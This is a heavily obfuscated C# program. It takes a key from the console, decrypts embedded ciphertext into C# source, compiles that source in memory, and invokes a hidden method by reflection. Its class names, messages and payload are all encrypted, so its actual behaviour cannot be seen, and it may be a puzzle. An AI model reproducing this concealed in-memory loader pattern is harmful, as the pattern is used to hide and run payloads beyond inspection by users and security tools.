using Microsoft.CSharp;
using x;
using System;
using System.Security.Cryptography;
using System.Text;
using System.CodeDom.Compiler;
using System.Reflection;
using n;

namespace x
{
    public class xx
    {
        public string xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx = @"RnEf+X380qySoQzZNeyKoM4vc78bZOE8LDGeNhURw0ghqYV9xq7Ztmd+VvbHJ2soZk3barr49vo0cpXuN3bvSABXb8sFdW7ueLsd3z29FE9FquXxj4BUPmW2EzbjPQt5dr/q9d3Q1l0Ao72qQwgP8htjDpgZ3wZy8lUzP7W+6X60kBL88xGN7LEbPq/kS6EN7nEDeAtf2X5j5ilOLofp/5RNk2h4d0RcK33zsZf3vRh/8oNx2vqcg4NG1mgL6I7/UWzi1lnR8EQk4Ii1j+r9oQYpw0cqCUmT", xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx = @"Kr58uLFj8xerAJE2ezEQUsBzUHUGq3Aqo1jdC22VTVi241MbABHFyvLV / 5fY/6yaV47g+pyC1TjQ4PhP61m+k5Gk+QcYefb0xpmjG3o1oKHOXsVdfxB4cVeO4PqcgtU4m8Y7N4YlAo8fEc+porPiCM5exV1/EHhxpOc/KUuW1d7OXsVdfxB4cYBekfBsbP+lw71NunnwhFqGT+ZPD+wnGzLuA4KIx3Sa0tK3DYQb0s9Ndl2TxdAhTD3tjPddW6AQRUhC+Yw593tZzatNz0je/k8LEBnppyk03cTGlmnT3VM=";

        public void xxx()
        {
             CompilerParameters xxxxxxxxxxxxxxxxxxxx = new CompilerParameters(); CompilerResults xxxxxxxxxxxxxxxxxxxxxx = null; xxxxxxxxxxxxxxxxxxxx.ReferencedAssemblies.Add(
                D.d("ayCAeTKFs2+ZdxG3APB4gA==",
                "xzxzx")); xxxxxxxxxxxxxxxxxxxx.GenerateInMemory = true; Console.WriteLine(D.d("3USjO4QE/RvtS4EUQfktpiYowBOgcn5m",
               "xzxzxz")); try
            {
                xxxxxxxxxxxxxxxxxxxxxx =
    ((ICodeCompiler)X.I).CompileAssemblyFromSource(
      xxxxxxxxxxxxxxxxxxxx,
      D.d
      (
          this.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,
          Console.ReadLine()
          ));
            }
            catch
            {
                xxxxxxxxxxxxxxxxxxxxxx
               =
               ((ICodeCompiler)X.I).CompileAssemblyFromSource
               (
                   xxxxxxxxxxxxxxxxxxxx, D.d(
                   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,
               "zz"));
            }
            if (xxxxxxxxxxxxxxxxxxxxxx.Errors.HasErrors)
            {
                string xxxxxx = "";

                xxxxxx = xxxxxxxxxxxxxxxxxxxxxx.Errors.Count.ToString() + D.d("kIiExIFs1viYHeTFINhsTw==", "xzx");
                for (int x = 0; x < xxxxxxxxxxxxxxxxxxxxxx.Errors.Count; x++)
                    xxxxxx = xxxxxx + D.d("E8XZC3xmNX5a8VSWQzv1Mg==", "xzxzxzx") + xxxxxxxxxxxxxxxxxxxxxx.Errors[x].Line.ToString() + D.d("ME0XuV00YPA=", "xzxzxzxz") +
                        xxxxxxxxxxxxxxxxxxxxxx.Errors[x].ErrorText; Console.WriteLine(xxxxxx + D.d("pO9B+7d/oYr0Ox1CGmi5Hw==", "xzxzxzxzx") + this.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx); return;
            }
            Assembly xxxxxxxxxxxxxxxxxx = xxxxxxxxxxxxxxxxxxxxxx.CompiledAssembly; Object xxxxxxxxxxxxxxxxxxxxxxx = xxxxxxxxxxxxxxxxxx.CreateInstance(D.d("xNW5kIlqwFqkzCTgbEREZw==", "xz"));
            if (xxxxxxxxxxxxxxxxxxxxxxx == null) { Console.WriteLine(D.d("2NPZ8WiyWnfzeVZtvIiEvpg4MpJX8gaGHspW8tpNGM4=", "xzxzxzxzxy")); return; }
            object[] xxxxxxxxxxx = new object[0];
            try
            {
                object xxxxxx =
                    xxxxxxxxxxxxxxxxxxxxxxx.GetType().InvokeMember(
                    D.d(
                        "HznMO9eYXik="
                        ,
                        "xzxzxzxzx")
                        ,
                    (
                    (BindingFlags
                    )
                    ((1 * 2
                    * 2 * 2 *
                    2 * 2)
                    * (2 * 3
                    + 2)
                    )),
                    null,
                    xxxxxxxxxxxxxxxxxxxxxxx,
                    xxxxxxxxxxx);
            }
            catch (Exception xxxxx)
            {
                Console.WriteLine(
                    xxxxx.Message
                    );
            }
            Console.ReadLine
                (
                );
        }
    }
}
namespace HMC
{
    class Program
    {
        static void Main(string[] args)
        {
            xx t = new xx();

            t.xxx();
            Console.ReadLine();
        }
    }

    
}
